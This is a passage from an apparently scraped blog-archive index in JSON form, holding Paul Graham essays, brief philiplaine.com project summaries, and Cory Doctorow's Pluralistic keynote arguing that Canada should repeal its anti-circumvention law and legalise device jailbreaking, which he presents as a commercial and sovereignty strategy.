exponential growth guarantees both the shape and magnitude of the return curve \u2014 because something that grows fast enough will grow big even if it's trivially small at first \u2014 but thresholds only guarantee the shape. [ 4 ] A principle for taking advantage of thresholds has to include a test to ensure the game is worth playing. Here's one that does: if you come across something that's mediocre yet still popular, it could be a good idea to replace it. For example, if a company makes a product that people dislike yet still buy, then presumably they'd buy a better alternative if you made one. [ 5 ] It would be great if there were a way to find promising intellectual thresholds. Is there a way to tell which questions have whole new fields beyond them? I doubt we could ever predict this with certainty, but the prize is so valuable that it would be useful to have predictors that were even a little better than random, and there's hope of finding those. We can to some degree predict when a research problem isn't likely to lead to new discoveries: when it seems legit but boring. Whereas the kind that do lead to new discoveries tend to seem very mystifying, but perhaps unimportant. (If they were mystifying and obviously important, they'd be famous open questions with lots of people already working on</p> <p>... (\u5185\u5bb9\u5df2\u622a\u65ad)</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:03</p>"},{"location":"paulgraham.com/The%20Need%20to%20Read/","title":"The Need to Read","text":"<p>\u6765\u6e90: paulgraham.com \u53d1\u5e03\u65f6\u95f4: \u94fe\u63a5: http://www.paulgraham.com/read.html</p> <p>November 2022 In the science fiction books I read as a kid, reading had often been replaced by some more efficient way of acquiring knowledge. Mysterious \"tapes\" would load it into one's brain like a program being loaded into a computer. That sort of thing is unlikely to happen anytime soon. Not just because it would be hard to build a replacement for reading, but because even if one existed, it would be insufficient. Reading about x doesn't just teach you about x; it also teaches you how to write. [ 1 ] Would that matter? If we replaced reading, would anyone need to be good at writing? The reason it would matter is that writing is not just a way to convey ideas, but also a way to have them. A good writer doesn't just think, and then write down what he thought, as a sort of transcript. A good writer will almost always discover new things in the process of writing. And there is, as far as I know, no substitute for this kind of discovery. Talking about your ideas with other people is a good way to develop them. But even after doing this, you'll find you still discover new things when you sit down to write. There is a kind of thinking that can only be done by writing . There are of course kinds of thinking that can be done without writing. If you don't need to go too deeply into a problem, you can solve it without writing. If you're thinking about how two pieces of machinery should fit together, writing about it probably won't help much. And when a problem can be described formally, you can sometimes solve it in your head. But if you need to solve a complicated, ill-defined problem, it will almost always help to write about it. Which in turn means that someone who's not good at writing will almost always be at a disadvantage in solving such problems. You can't think well without writing well, and you can't write well without reading well. And I mean that last \"well\" in both senses. You have to be good at reading, and read good things. [ 2 ] People who just want information may find other ways to get it. But people who want to have ideas can't afford to. Notes [ 1 ] Audiobooks can give you examples of good writing, but having them read to you doesn't teach you as much about writing as reading them yourself. [ 2 ] By \"good at reading\" I don't mean good at the mechanics of reading. You don't have to be good at extracting words from the page so much as extracting meaning from the words. Japanese Translation Chinese Translation Italian Translation French Translation</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:07</p>"},{"location":"paulgraham.com/What%20You%20%28Want%20to%29-%20Want/","title":"What You (Want to)* Want","text":"<p>\u6765\u6e90: paulgraham.com \u53d1\u5e03\u65f6\u95f4: \u94fe\u63a5: http://www.paulgraham.com/want.html</p> <p>November 2022 Since I was about 9 I've been puzzled by the apparent contradiction between being made of matter that behaves in a predictable way, and the feeling that I could choose to do whatever I wanted. At the time I had a self-interested motive for exploring the question. At that age (like most succeeding ages) I was always in trouble with the authorities, and it seemed to me that there might possibly be some way to get out of trouble by arguing that I wasn't responsible for my actions. I gradually lost hope of that, but the puzzle remained: How do you reconcile being a machine made of matter with the feeling that you're free to choose what you do? [ 1 ] The best way to explain the answer may be to start with a slightly wrong version, and then fix it. The wrong version is: You can do what you want, but you can't want what you want. Yes, you can control what you do, but you'll do what you want, and you can't control that. The reason this is mistaken is that people do sometimes change what they want. People who don't want to want something \u2014 drug addicts, for example \u2014 can sometimes make themselves stop wanting it. And people who want to want something \u2014 who want to like classical music, or broccoli \u2014 sometimes succeed. So we modify our initial statement: You can do what you want, but you can't want to want what you want. That's still not quite true. It's possible to change what you want to want. I can imagine someone saying \"I decided to stop wanting to like classical music.\" But we're getting closer to the truth. It's rare for people to change what they want to want, and the more \"want to\"s we add, the rarer it gets. We can get arbitrarily close to a true statement by adding more \"want to\"s in much the same way we can get arbitrarily close to 1 by adding more 9s to a string of 9s following a decimal point. In practice three or four \"want to\"s must surely be enough. It's hard even to envision what it would mean to change what you want to want to want to want, let alone actually do it. So one way to express the correct answer is to use a regular expression. You can do what you want, but there's some statement of the form \"you can't (want to)* want what you want\" that's true. Ultimately you get back to a want that you don't control. [ 2 ] Notes [ 1 ] I didn't know when I was 9 that matter might behave randomly, but I don't think it affects the problem much. Randomness destroys the ghost in the machine as effectively as determinism. [ 2 ] If you don't like using an expression, you can make the same point using higher-order desires: There is some n such that you don't control your nth-order desires. Thanks to Trevor Blackwell, Jessica Livingston, Robert Morris, and Michael Nielsen for reading drafts of this. Irish Translation</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:08</p>"},{"location":"philiplaine.com/","title":"philiplaine.com\\n\\n\u7f51\u7ad9: https://philiplaine.com\\nRSS: https://philiplaine.com/index.xml\\n\\n---\\n\\n## \u6700\u65b0\u6587\u7ae0\\n\\n- Getting Forked by Microsoft_20260205\\n- Kubernetes Generated Secret_20260205\\n- Cross Compiling Docker Images_20260205\\n- Laine Cloud_20260205\\n- Alfrodull_20260205\\n","text":""},{"location":"philiplaine.com/Alfrodull_20260205/","title":"Alfrodull\\n\\n\u6765\u6e90: https://philiplaine.com\\n\u94fe\u63a5: https://philiplaine.com/portfolio/alfrodull/\\n\u65e5\u671f: Sat, 17 Aug 2019 00:00:00 +0000\\n\\n---\\n\\nAlfrodull is a utility to easily control LED devices connected to a computer based on predefined events. Everything is configured with a single file, allowing for simple configuration of event type, light color and transition animation in seconds.","text":""},{"location":"philiplaine.com/Cross%20Compiling%20Docker%20Images_20260205/","title":"Cross Compiling Docker Images\\n\\n\u6765\u6e90: https://philiplaine.com\\n\u94fe\u63a5: https://philiplaine.com/posts/cross-compiling-docker-images/\\n\u65e5\u671f: Fri, 20 Sep 2019 20:00:00 +0200\\n\\n---\\n\\nIt has been an issue for a long time to run Docker images on multiple architectures. I remember the first time I got the idea to install Docker on my Raspberry Pi and I realized quickly that what I was trying to do would not work. The issue of course was that I was trying to use an AMD64 compiled Docker image on a ARM 32 bit CPU. Anyone who works with any lower level languages would call me an idiot for realizing this sooner than later. I would agree with them. Docker just seems to work like magic, running on most machines without any issue, like running Linux containers on Windows. One thing that has not been easy though is building Docker images on one type of CPU and running them on another.","text":""},{"location":"philiplaine.com/Getting%20Forked%20by%20Microsoft_20260205/","title":"Getting Forked by Microsoft\\n\\n\u6765\u6e90: https://philiplaine.com\\n\u94fe\u63a5: https://philiplaine.com/posts/getting-forked-by-microsoft/\\n\u65e5\u671f: Mon, 21 Apr 2025 00:00:00 +0000\\n\\n---\\n\\nThree years ago, I was part of a team responsible for developing and maintaining Kubernetes clusters for end user customers. A main source for downtime in customer environments occurred when image registries went down. The traditional way to solve this problem is to set up a stateful mirror, however we had to work within customer budget and time constraints which did not allow it. During a Black Friday, we started getting hit with a ton of traffic while GitHub container registries were down. This limited our ability to scale up the cluster as we depended on critical images from that registry. After this incident, I started thinking about a better way to avoid these scalability issues. A solution that did not need a stateful component and required minimal operational oversight. This is where the idea for\\nSpegel\\ncame from.","text":""},{"location":"philiplaine.com/Kubernetes%20Generated%20Secret_20260205/","title":"Kubernetes Generated Secret\\n\\n\u6765\u6e90: https://philiplaine.com\\n\u94fe\u63a5: https://philiplaine.com/portfolio/kubernetes-generated-secret/\\n\u65e5\u671f: Mon, 03 Feb 2020 00:00:00 +0000\\n\\n---\\n\\nSimple project to practice building Kuberentes controllers. I tried following best practices when developing the controller like using Kubebuilder to generate the template code and implementing integration tests.","text":""},{"location":"philiplaine.com/Laine%20Cloud_20260205/","title":"Laine Cloud\\n\\n\u6765\u6e90: https://philiplaine.com\\n\u94fe\u63a5: https://philiplaine.com/portfolio/laine-cloud/\\n\u65e5\u671f: Sun, 18 Aug 2019 00:00:00 +0000\\n\\n---\\n\\nThis is a fun hobby project based around a couple of Raspberry Pi. The goal was to run container based workloads across all of computers. The project has evolved into a Kubernetes cluster with persistent storage and a VPN tunnel to allow for serving of public websites.","text":""},{"location":"pluralistic.net/","title":"pluralistic.net","text":"<p>\u4ee5\u4e0b\u662f\u672c\u535a\u5ba2\u7684\u6240\u6709\u6587\u7ae0\uff1a</p> <ul> <li>Pluralistic- Disenshittification Nation (29 Jan 2026) 20260129</li> <li>Pluralistic- Justin Key's -The Hospital at the End Of the World- (04 Feb 2026) 20260204)</li> <li>Pluralistic- Michael Swanwick's -The Universe Box- (03 Feb 2026) 20260203)</li> <li>Pluralistic- Stock swindles (02 Feb 2026) 20260202</li> <li>Pluralistic- Threads' margin is the Eurostack's opportunity (30 Jan 2026) 20260130)</li> </ul> <p>\u672c\u535a\u5ba2\u6587\u7ae0\u7531 OpenClaw \u81ea\u52a8\u6293\u53d6</p>"},{"location":"pluralistic.net/Pluralistic-%20Disenshittification%20Nation%20%2829%20Jan%202026%29_20260129/","title":"Pluralistic: Disenshittification Nation (29 Jan 2026)Today\\'s linksDisenshittification Nation (permalink)Hey look at this (permalink)Object permanence (permalink)Upcoming appearances (permalink)Recent appearances (permalink)Latest books (permalink)Upcoming books (permalink)Colophon (permalink)How to get Pluralistic:","text":"<p>\u6765\u6e90: pluralistic.net \u53d1\u5e03\u65f6\u95f4: Thu, 29 Jan 2026 12:25:37 +0000 \u94fe\u63a5: https://pluralistic.net/2026/01/29/post-american-canada/</p> <p>{'type': 'text/html', 'language': None, 'base': 'https://pluralistic.net/feed/', 'value': '<p>rj\\n</p>\\n\\n<ul>\\n<li>Disenshittification Nation: How Canada can defend itself from Trump, make billions of dollars, and build a new, global, good internet.\\n</li>\\n<li>Hey look at this: Delights to delectate.\\n</li>\\n<li>Object permanence: \"Project Blue Sky\"; O\\'Reilly v Graham on inequality; Big Pharma\\'s worst nightmare; Dissipation of rents; Shoelace v Ming vases; \"Diviner\\'s Tale\": Great Humungous Snow Pile; Trudeau signs Harper\\'s trade deal; On Comity (pts 1 &amp; 2); What\\'s that dingus called?\\n</li>\\n<li>Upcoming appearances: Where to find me.\\n</li>\\n<li>Recent appearances: Where I\\'ve been.\\n</li>\\n<li>Latest books: You keep readin\\' em, I\\'ll keep writin\\' \\'em.\\n</li>\\n<li>Upcoming books: Like I said, I\\'ll keep writin\\' \\'em.\\n</li>\\n<li>Colophon: All the rest.\\n</li>\\n</ul>\\n<p></p>\\n\\n<p>\\n</p>\\n\\n<p></p>\\n<p>Yesterday, I gave the keynote address at the 2026 Digital Government Leaders Summit in Ottawa, Canada \u2013 an invitation only for CIOs, CTOs and senior technical personnel at Canadian federal ministries.</p>\\n<p>It was an honour to give this talk, and the organizers at the office of the CIO of the Government of Canada were kind enough to give me permission to post the transcript:</p>\\n\\n<p>Like all the best Americans, I am a Canadian, and while I have lived abroad for more than two decades, I flatter myself that I am still steeped in our folkways, and so as is traditional at events like this, I would like to begin by apologising.</p>\\n<p>I\\'m sorry.</p>\\n<p>I\\'m really sorry.</p>\\n<p>I know that at a tech event, you expect to hear from a speaker who will come up and tell you how to lose hundreds of billions of dollars building data-centres for the money-losingest technology in human history, a technology so wildly defective that we\\'ve had to come up with new, exotic words to describe its defects, like \"hallucination.\" A technology that will never recoup the capex already firehosed on \u2013 let alone the trillions committed to it \u2013 and whose only possible path to glory is to somehow get so good that it makes millions of people unemployed.</p>\\n<p>But don\\'t worry: you can\\'t make the word-guessing program into a \"superintelligence\" by shoveling more words into it. That\\'s like betting that if you keep breeding horses to run faster and faster, one of them will eventually give birth to a locomotive.</p>\\n<p>So I don\\'t have any suggestions for you today for ways to lose billions of dollars. I don\\'t have any ideas for how to destroy as many Canadian jobs as possible, I don\\'t even have any ideas to make Canada more dependent on US tech giants.</p>\\n<p>No, all I have for you today is a plan to make Canada tens of billions of dollars, by offering products and services that people want and will pay for, while securing the country\\'s resiliency and digital sovereignty, and winning the trade war, and setting the American people free, and launching our tech sector into a stable orbit for decades.</p>\\n<p>So once again, I\\'m sorry. So, so sorry.</p>\\n<p>I want to start by telling you a tariff story. It\\'s not the story that started last year. It\\'s a story that goes all the way back to the early 2000s. Indeed, the very start of this story dates back to 1998.</p>\\n<p>It starts in Washington, in October, 1998, when Bill Clinton signed a big, gnarly bill called the Digital Millennium Copyright Act (or DMCA) into law. Section 1201 \u2013 the \"anti-circumvention clause\" \u2013 of the DMCA establishes a new felony, punishable by a five-year prison sentence and a $500,000 fine for anyone who bypasses an \"access control\" while modifying a digital system.</p>\\n<p>These penalties apply irrespective of why you\\'re making that modification, and they apply even if the device you\\'re modifying is your own property. Which means that if the manufacturer decides you shouldn\\'t be able to do something with your digital device, well, you can\\'t do it. Even if it\\'s yours. Even if the thing you want to do is perfectly legal.</p>\\n<p>Right from the start, it was clear that this law was a bad idea. It was an enshittifier\\'s charter. Once you ban users from modifying their own property, you leave them defenceless. The manufacturer can sell you a gadget and then push an over-the-air update that degrades its functionality, and then demand that you pay a monthly \"subscription\" fee to get that functionality back.</p>\\n<p>This is a law purpose-built for anyone who aspires to graduate from the Darth Vader MBA, where the first and only lesson is, \"I\\'m altering the deal. Pray I don\\'t alter it any further.\"</p>\\n<p>Immediately upon the passage of this bill, two things happened: first, American tech companies started to rip off the American public, taking advantage of the fact that it was now a crime to disenshittify your own property; and second, the US Trade Representative went around the world in search of biddable public officials who could be flattered or bullied into bringing an anti-circumvention law onto their own country\\'s lawbooks.</p>\\n<p>The US had to get all its trading partners to pass these laws, otherwise those countries\\' own tech companies would go into business selling tools to disenshittify America\\'s defective tech exports: privacy blockers, jailbreaks, alternative clients, generic consumables, diagnostic tools, compatible parts and spares.</p>\\n<p>But if America could arm-twist its trading partners into passing anti-circumvention laws, then those countries would shut down any tech entrepreneurs who posed a competitive threat to America\\'s metastasizing, inbred tech giants, and the people in those countries would be easy pickings for America\\'s tech giants as they plundered the world\\'s cash and data.</p>\\n<p>Right from the start, the US Trade Rep targeted Canada for these demands. The only problem was that Canadians hated anti-circumvention law. We\\'d had a front row seat to all the ways that our American cousins were getting fleeced by their tech companies, and we had no desire to share their plight.</p>\\n<p>Plus, we\\'ve got some smart nerds here who could easily see themselves exporting very lucrative tools of technological liberation across the southern border. Hell, if we can supply America with reasonably priced pharmaceuticals through the mails, then we can surely sell them excellent anti-ripoff mods over the internet.</p>\\n<p>Paul Martin\\'s Liberals took two runs at passing anti-circumvention law but failed hard. The architect of this project, a Toronto MP named Sam Bulte lost her seat over it, and the Liberal brand became so toxic in Parkdale-High Park that the seat flipped to the NDP for a generation.</p>\\n<p>Then it was Stephen Harper\\'s turn. First, he tasked Jim Prentice with getting an anti-circumvention law through Parliament, and when Prentice failed, Harper turned to Industry Minister Tony Clement and Heritage Minister James Moore with getting the ball over the line. Clement and Moore tried to rehabilitate the idea of anti-circumvention with a public consultation: \"See? We\\'re listening!\"</p>\\n<p>Boy, did that backfire. 6,138 of us wrote into the consultation to condemn the proposal. 53 Vichy nerds wrote in to support it.</p>\\n<p>Moore was clearly stung. Shortly after the consultation, he gave a keynote to the International Chamber of Commerce meeting in Toronto, where he dismissed all 6,138 of us as \"babyish\u2026radical extremists.\"</p>\\n<p>Then Harper whipped his caucus and passed Bill C-11, The Copyright Modernization Act, in 2012, pasting America\\'s anti-circumvention law into our lawbooks. Now, I don\\'t think that Moore and Clement were particularly motivated by their love of digital locks. Nor was Stephen Harper. Rather, they were under threat from the US Trade Representative, who told them that America would whack us with tariffs if we failed to arrange a hospitable environment for America\\'s tech companies.</p>\\n<p>Well, I don\\'t know if you\\'ve heard, but Trump whacked us with tariffs anyway. When someone threatens to burn your house down unless you do as you\\'re told, and they burn your house down anyway, you don\\'t have to keep taking their orders. Indeed, you\\'re a sucker if you do.</p>\\n<p>In the 15 years since we capitulated to America\\'s policy demands, US Big Tech has grown too big to fail, too big to jail, and too big to care.</p>\\n<p>To Canada\\'s credit, we\\'ve tried a bunch of things to rein in Big Tech:</p>\\n<ul>\\n<li>We tried to get them to pay to link to the news (instead, they just blocked all Canadian news);\\n</li>\\n<li>\\n<p>We tried to get them to include Canadian content in their streaming libraries (they lobbied, sued and bullied their way out of it);</p>\\n</li>\\n<li>\\n<p>We tried to make them pay a 3% tax, despite the fiction that all their profits are floating in a state of untaxable grace in the Irish Sea (and they got Trump to terrify Carney into walking it back).</p>\\n</li>\\n</ul>\\n<p>This is the \"too big to jail\" part. When a company is a couple orders of magnitude larger than your government, what hope do you have of regulating it? Back a couple years ago, when America\\'s antitrust regulators were also riding Big Tech\\'s ass, there was a chance that we could make a rule and they would help us make it stick.</p>\\n<p>But now that the CEOs of all the Big Tech companies personally gave the Trump campaign a million bucks each for a seat on the inauguration dais, and now that all the tech giants have donated millions to Trump\\'s new Epstein Memorial Ballroom at the White House, and now that Apple CEO Tim Cook has assembled a gilded participation trophy for Trump on camera, we\\'ve got no hope of getting Big Tech to colour inside the lines.</p>\\n<p>So what are we to do?</p>\\n<p>Well, we could continue with our current response to the Trump tariffs. You know: retaliatory tariffs, where we make everything Canadians buy more expensive, because Canadians are famous for just loving it when their prices go up. This is a great way to punish Trump. It\\'s like punching ourselves in the face as hard as we can, and hoping the downstairs neighbour says \"ouch.\"</p>\\n<p>But there\\'s another way: now that we\\'re living with the tariffs we were promised we could avoid by passing an anti-circumvention law, why don\\'t we get rid of that law? There is so much money waiting for us if we go into business disenshittifying America\\'s defective tech products.</p>\\n<p>Take just one example: app stores. Apple takes 30 cents out of every dollar that an Apple user spends in an app. If your app tries to use another payment method, they\\'ll turf it out of the App Store. And of course, iPhone owners can\\'t replace Apple\\'s app store with another one, because the iPhone has an \"access control,\" so it\\'s a crime to change your app store.</p>\\n<p>30% is an insane transaction rake. I mean, here in Canada, we make person-to-person payments for free. Visa \u2013 an enshittified monopolist if ever there was one \u2013 charges 3-5%. Apple charges Thirty. Percent.</p>\\n<p>Do you have any idea how lucrative this is? It is literally the most lucrative line of business Apple is in. It makes Apple more pure profit than any other line of business, even more than the $20b cash bribe Google pays them every year not to make a competing search engine. $20b is chump-change. Apple makes one hundred billion dollars a year on this racket.</p>\\n<p>They impose a 30% tax on the whole digital economy, and they get to self-preference. So if you want to sell ebooks or videos on an app, Apple charges you 30%, but when Apple sells ebooks and videos on its own apps, it doesn\\'t charge itself 30%. And they get to structure the market. They can exclude any app they want, for any reason, and then no Apple customer in the world can have that app.</p>\\n<p>Last fall, Apple banned an app called \"ICE Block.\" That\\'s an app that warns you if there are ICE thugs nearby, so you can avoid getting kidnapped and sent to a Salvadoran slave-labor camp or shot in the face by a guy with a Waffen SS tattoo under his plate carrier and a mask over his nose. Apple classed ICE murderers as a \"protected class\" and yanked the app.</p>\\n<p>So imagine for a sec that Canada repealed Bill C-11, belatedly heeding the advice of those 6,138 people who wrote into James Moore and Tony Clement\\'s consultation to warn them, basically, that this was going to happen. When that happens, some smart Waterloo grads, backed by some RIM money, can go into business making jailbreaking kits and app store infrastructure for iPhones, and they can sell these to everyone in the world who wants to operate their own app store, who wants to compete with Apple.</p>\\n<p>Offer the world a 90% discount on Apple\\'s app tax, and you\\'re talking about a ten billion dollar/year business. Maybe Canada will never have another RIM, but RIM had a tough business. They had to make hardware, which is risky and capital intensive. Legalize jailbreaking and we can let Apple make the hardware, and then we can cream off the hundred billion dollars in rents they book every year. That\\'s a much better business to be in.</p>\\n<p>You know what Jeff Bezos said to a roomful of publishers when he started Amazon? \"Your margin is my opportunity.\" But these guys are such crybabies. When they do it to us it\\'s progress; when we do it to them, it\\'s piracy.</p>\\n<p>I mean, come on. Elbows up, right? Move fast and break their things. Move fast and break kings.</p>\\n<p>You know all that stuff we failed to get Big Tech to do? Pay for news, put cancon in their streaming lineups? This is how we get it. We can\\'t make Apple or Google or Netflix change their software. We can fine \\'em, sure, but Trump will just order his judges not to issue court orders when we try to collect, and ban his banks from transferring the money.</p>\\n<p>In any game, the ref has to be more powerful than the players on the field. Otherwise, they\\'ll do exactly what Big Tech has done to us: ignore our rulings and keep on cheating.</p>\\n<p>We don\\'t have any hope of controlling what Big Tech does, but there is one thing we have total, absolute control over: what we do. We don\\'t have to let American companies make use of our courts to shut down Canadian companies that disenshittify their defective products. The laws of Canada are under total and final Canadian control. Repeal Bill C-11, legalize jailbreaking, and we\\'ll unshackle our technologists and entrepreneurs, and sic \\'em on those subpar American products.</p>\\n<p>Meta takes the news out of its apps? Let \\'em! We\\'ll just start selling a multiprotocol alt-client, one that merges your Facebook, Insta, Twitter, Linkedin, Bluesky, and Mastodon feeds, blocks all the ads, blocks all the tracking, and puts the news back in your feed.</p>\\n<p>Netflix won\\'t put Canadian media in their library? Fine! We\\'ll start selling an alt client that lets Canadians search and stream from all the services they subscribe to, and adds in a PVR so you can record your favourite shows to watch later, or archive against the day that the streaming company ditches them. A video recorder would handily delete Amazon Prime\\'s grinchiest scam, where all the Christmas specials move from the free tier to $3.99 rentals in November, and go back into the free tier in March. Just record the kids\\' most beloved Christmas specials in July and bring \\'em out in December.</p>\\n<p>Think about this for a second: we uninvented the VCR. The VCR, one of the most popular, transformative technologies in modern history. A wildly profitable technology, too. Once all the video went digital, and once all the digital video threw in an \"access control\" that blocked recording, it became a crime to record digital cable, satellite, or streaming, unless you used the service\\'s own PVR, which won\\'t let you tape some shows, or skip ads, and which deletes your stored shows when the broadcaster decides you don\\'t deserve to have them anymore.</p>\\n<p>It\\'s not illegal to record a video stream, no more than it was illegal to record a TV show off your analog cable or broadcast receiver. The same fair dealing exemptions apply. But because it\\'s illegal to bypass an access control, and the access control blocks recording, we uninvented the VCR. We made the VCR illegal. Not because Parliament ever passed a law banning VCRs, but because our anti-circumvention law allows dominant corporations to simply decide that certain conduct that they disprefer should no longer occur.</p>\\n<p>With Bill C-11, we\\'ve created \"felony contempt of business model.\" In living memory, video recording changed the world and made billions of dollars. Today, we\\'ve all lost our video recorders. But we have more reason than ever to want a video recorder; to pay for a video recorder. There\\'s fantastic amounts of money just sitting there on the table, money we\\'ve prohibited our entrepreneurs from making, in order to prevent the US from hitting us with the tariffs that they\\'ve just hit us with.</p>\\n<p>Let\\'s be clear here: no one has the right to a profit. If you\\'ve got a business that sucks, and I make it not suck anymore, and your customers start paying me instead of you, well, that sounds like a you problem to me. I mean, does the Canadian government really want to decide which desirable products can and can\\'t exist?</p>\\n<p>Look, I\\'ve mainlined Tommy Douglas since I was in red diapers, but that sounds pretty commie, even to me.</p>\\n<p>Which brings me to Canada\\'s own sclerotic, monopoly-heavy commercial environment. After all, Canada is two monopolists and a mining company in a trenchcoat. Which is not to say that our oligarchs are weak. They love to throw their weight around. I guess owning an entire maritime province can go to your head.</p>\\n<p>Will any of these guys step up to cape for America\\'s tech giants? Do any of them benefit from our voluntary decision to let America walk all over us? Not really. But a little, at the margins. Guys like Ted Rogers make a lot of money by making us rent set-top boxes for our cable, which lock out recorders. Re-invent the VCR and Ted Rogers might have to sell his ivory-handled back-scratcher collection.</p>\\n<p>But let him squawk! He can afford the loss, and lest we forget, Ted Rogers made his second fortune renting us video cassettes to stick in our VCRs. When he did it, it was progress. If we do it to him, that\\'s not piracy.</p>\\n<p>Man, there is so much money to be made by becoming the disenshittification nation. It\\'s not just payments or video recorders. One of the main uses of access controls is blocking generic consumables, like inkjet ink. Parliament never made a law saying that people who buy a printer from HP have to buy their ink from HP, too. But because we made it illegal to bypass an access control, and because HP uses access controls to block generic ink, it\\'s a felony to use cheap ink in your own printer.</p>\\n<p>The cartel of four giant inkjet companies know they have us trapped, and they have monotonically raised and raised and raised the price of ink, so that today, printer ink is the most expensive fluid a civilian can purchase without a government permit. At $10,000 per gallon, it would be cheaper to print your grocery lists with the semen of a Kentucky Derby winning stallion.</p>\\n<p>Some smart Canadian technologists could buy every make and model of every printer, and prepare a library of jailbreaks that works across every one, and keep it up to date with every new software update as soon as it\\'s pushed. Everyone in the world who wants to refill ink cartridges or manufacture generics could pay that company $25/month for access to the jailbreaking library and for support if a customer ran into a problem.</p>\\n<p>Every manic entrepreneur running a corner store with a Bitcoin ATM, knife-sharpening and Amazon parcel dropoff could add inkjet ink to their line of business. Multiply every guy with a folding table at a dry-cleaner who\\'ll fix your phone or jailbreak your printer by $25/month, by 12 months/year, and you\\'ve got tens or hundreds of millions flowing into this country.</p>\\n<p>We would transform HP\\'s billions into our millions, and the rest would be shared among the world\\'s printer owners as a consumer surplus and freedom from a scummy rent-seeking racket.</p>\\n<p>There\\'s more!</p>\\n<p>Every mechanic is paying $10,000 per manufacturer per year for the diagnostic tool that decrypts the messages on your car\\'s CAN bus and turns your \"check engine\" light into an actual error, and you\\'d better bet your mechanic is passing that cost onto you. Canadian car hackers can buy every make and model of every car as it comes off the line, jailbreak it, and keep it jailbroken with every new over-the-air update, and sell every mechanic in the world a $50/month subscription to a bang up to date diagnostic tool.</p>\\n<p>The mechanic wins. The drivers win. Canada wins. The Big Three automakers eat dirt, which is fine. Looks like we\\'re buying Chinese cars from now on, anyway, and Parliament never passed a law guaranteeing perpetual profitability to legacy automakers whose most innovative ideas consist of finding ways to rent you the accelerator pedal in your car, and new markets to sell the driving data they steal from you.</p>\\n<p>All kinds of devices can\\'t be fixed because of our anti-circumvention law, Bill C-11. You\\'ve probably heard about the problems farmers have fixing their John Deere tractors. Farmers actually do the repairs on those tractors, installing the parts themselves, but the tractor\\'s main computer will not activate those parts until the farmer pays a couple hundred bucks for a callout by a John Deere rep, who enters an unlock code that tells the tractor that John Deere got paid for this repair.</p>\\n<p>Farmers have been fixing their implements since prehistory. Since the invention of the plow.</p>\\n<p>Beamish is Europe\\'s largest open-air museum, just outside of Newcastle. Here we\\'d call it a \"pioneer village.\" They\\'ve rescued and relocated a whole Victorian village high street, an Edwardian colliery and workers\\' cottages, vehicles from all eras of British history, and they\\'ve got a farmhouse that sits on a Roman foundation.</p>\\n<p>That farmhouse has a forge. Because of course it does. Farmers have to be able to fix their stuff, because when the storm is coming, and you need to get the crops in, you can\\'t wait for a service technician to find their way to the end of your lonely country road.</p>\\n<p>But John Deere has declared an end of history, and our Copyright Modernization Act let them do it. Farmers can\\'t fix their tractors anymore, not because Parliament ever passed the \"No Fixing Your Tractor Act.\" They didn\\'t need to. They just passed an act that banned circumvention of access controls, which lets John Deere \u2013 and other rapacious American monopolists \u2013 conjure new felonies out of thin air. There\\'s that \"felony contempt of business model\" again.</p>\\n<p>At this point you might be thinking, \"Hold on a sec, didn\\'t Trudeau whip his caucus to get a Right to Repair bill through Parliament in 2024?\" You\\'re right, he did: Bill C-244. It lets anyone fix anything\u2026unless they have to bypass an access control in order to make the repair, in which case Bill C-11 makes that repair illegal. Canada\\'s got a Right to Repair law that\\'s big, bold, ambitious\u2026and useless, a mere ornament, thanks to our anti-circumvention law, which we passed because the US promised us tariff-free access to US markets, a promise that the US has broken, and that we should never believe again.</p>\\n<p>Everything we\\'ve tried to do to make Canada safe for US tech exports has failed. They\\'ve failed because they\\'re redistributive. We told them they could keep stealing money from our news companies so long as they gave some of it back. We told them they could keep stealing money from people who need to fix their property so long as they follow some rules. We told them they could keep stealing money from our market participants so long as they mixed some cancon in with their streaming libraries. Even our privacy laws are redistributive: sure, go on stealing Canadians\\' data, just promise to limit the ways you abuse it to a short list of permissible human rights violations.</p>\\n<p>You know what\\'s better than redistribution? Predistribution. Rather than bargaining to recoup some of the value being stripmined from us, we can intervene technologically to prevent the theft in the first place: jailbreak our devices, abolish the app tax, block their monopoly ad insertions and replace them with open ad markets based on content, not surveillance, give users control over the media in their streaming libraries. Let Canadian businesses disenshittify our phones, TVs, tractors, cars and ventilators so anyone can fix them.</p>\\n<p>Ask any economist and they\\'ll tell you that the very best strategy is to have an open, fair system in the first place. Rather than tolerating and even enshrining unfairness in the system, and then begging the beneficiaries of that unfairness to dribble a few crumbs to the hungry victims at their feet.</p>\\n<p>Perhaps all of this is unconvincing to you. Maybe you\\'re not interested in our digital rights. Maybe you\\'re not excited by the prospect of turning America\\'s trillions into Canada\\'s billions. Well, don\\'t worry, I\\'ve got something for you, too: national security.</p>\\n<p>Trump has made it clear that America no longer has allies or trading partners, it only has rivals and adversaries. He\\'s also made it clear that he cannot be mollified. Any concessions we make to him will be treated as a sign of weakness, and an invitation to demand more. Give him an inch, he\\'ll take a kilometer.</p>\\n<p>Give him an inch, he\\'ll take Greenland.</p>\\n<p>This is undeniably scary, because Trump has lots of non-kinetic options for pursuing his geopolitical aims. First among them is attacking his adversaries through his tech companies. He\\'s already started tinkering with this. When the International Criminal Court issued an arrest warrant for the genocidaire Benjamin Netanyahu, Trump went through the roof, and Microsoft obliged him by shutting down the court\\'s access to its documents, emails, calendars and address books. They bricked the court.</p>\\n<p>Now, I should say here that Microsoft denies that they shut down the court to please Trump. They say it\\'s a coincidence. But when it comes to a \"he-said/Clippy-said\" dispute between the human rights defenders at the ICC and the convicted monopolists at Microsoft, I know who I believe. What\\'s more, Anton Carniaux, Director of Public and Legal Affairs at Microsoft France, told a French government inquiry that he \"couldn\\'t guarantee\" that Microsoft wouldn\\'t hand sensitive French data over to the US government, even if that data was stored in a European data-centre. And under the CLOUD Act, the US government can slap gag orders on the companies that it forces to cough up that data, so there\\'d be no way to even know if this happened, or whether it\\'s happening right now.</p>\\n<p>Trump has demonstrated that he will both bully and bribe US companies into doing his bidding. Cross him and he\\'ll put extra tariffs on the inputs you need to import from abroad, he\\'ll take away your key workers\\' visas and deport them, he\\'ll smack you with pretextual antitrust investigations, and sue you in his personal capacity.</p>\\n<p>But if you capitulate to him, he\\'ll give you no-bid government contracts, and hand you billions to provide surveillance gear and prison camps to help with his programme of ethnic cleansing. The tech companies are up to their eyeballs in Trump\\'s authoritarian takeover of the US. There\\'s no daylight between Amazon, Google, Meta, Microsoft, Oracle, Apple and other US tech companies and the Trump regime.</p>\\n<p>You can be certain that if \u2013 when! \u2013 Trump 